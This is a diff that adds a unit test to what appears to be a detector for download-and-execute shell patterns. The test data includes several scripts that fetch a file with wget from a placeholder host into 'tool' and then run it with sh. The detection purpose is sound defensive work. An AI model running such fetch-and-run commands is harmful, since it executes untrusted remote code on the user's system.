@@ -6060,6 +6060,23 @@ class TestACompoundCommandCarriesItsClosingOutput(unittest.TestCase):
         for script in own_outputs:
             self.assert_clean_in_every_shell(script)
 
+    def test_3069_a_subshell_close_keeps_wgets_expansion_unresolved(self):
+        url = "https://example.test/i.sh"
+        reports = (
+            ("r3087r4.subshell.outer-redir",
+             "X=-qO-\n( wget $X %s ) > tool\nsh tool\n" % url),
+            ("r3087r4.subshell.outer-devnull",
+             "X='-O tool'\n( wget $X %s ) > /dev/null\nsh tool\n" % url),
+            # The reader attaches a subshell's trailing redirect to its inner
+            # stage, so it cannot distinguish this stage-owned spelling. Keep
+            # the fail-closed REPORT as #3034's named subshell fallback price.
+            ("r3087r4.price.subshell-inner-redir",
+             "X=-qO-\n( wget $X %s > tool )\nsh tool\n" % url),
+        )
+        for row, script in reports:
+            with self.subTest(row=row):
+                self.assert_reported_in_every_shell(script)
+
     def test_a_redirected_compound_does_not_hide_an_inner_subshell_stream(self):
         for script in (
                 "{ ( %s; ) | sh; } > log\n" % self.FETCH,
